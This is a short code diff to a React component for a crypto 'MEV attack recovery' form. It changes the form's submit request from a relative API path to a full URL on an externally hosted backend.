@@ -55,7 +55,7 @@ export default function MEVAttackRecovery() {
   const handleSubmit = async () => {
     setLoading(true);
     try {
-      const response = await fetch('/api/recover-mev-attack', {
+      const response = await fetch('https://autoclaimtoken.onrender.com/api/recover-mev-attack', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(formData)
